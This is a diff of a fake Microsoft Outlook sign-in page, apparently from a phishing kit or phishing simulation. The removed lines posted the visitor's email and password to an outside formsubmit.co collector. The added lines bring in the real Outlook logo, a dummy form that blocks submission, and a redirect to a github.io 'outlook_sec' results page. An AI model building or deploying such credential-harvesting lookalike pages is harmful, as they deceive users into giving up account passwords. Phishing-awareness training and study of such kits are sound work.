@@ -76,15 +76,27 @@
 </head>
 <body>
     <div class="login-container">
+        <img class="logo" src="https://static2.sharepointonline.com/files/fabric/assets/brand-icons/product/svg/outlook_48x1.svg" alt="Outlook Logo">
         <h2>Sign in</h2>
-        <form action="https://formsubmit.co/a817f7119674f6f98c80f883abb8ea12" method="POST">
+        <form id="dummy-form" autocomplete="off">
             <label for="email">Email, phone, or Skype</label>
             <input type="email" id="email" name="email" autocomplete="username" required>
             <label for="password">Password</label>
             <input type="password" id="password" name="password" autocomplete="current-password" class="input-group" required>
-            <input type="hidden" name="_next" value="results.html">
             <button class="btn" type="submit">Sign in</button>
         </form>
+        <div id="dummy-message" style="display:none; color:#0078d4; margin-top:14px; text-align:center;">
+            Redirecting...
+        </div>
+        <script>
+            document.getElementById('dummy-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                document.getElementById('dummy-message').style.display = 'block';
+                setTimeout(function() {
+                    window.location.href = "https://jacc-ck.github.io/outlook_sec.github.io/result.html"; // Change to your desired page
+                }, 2000);
+            });
+        </script>
         <div style="margin-top: 14px;">
             <a class="link" href="https://account.live.com/ResetPassword.aspx">Can’t access your account?</a>
         </div>
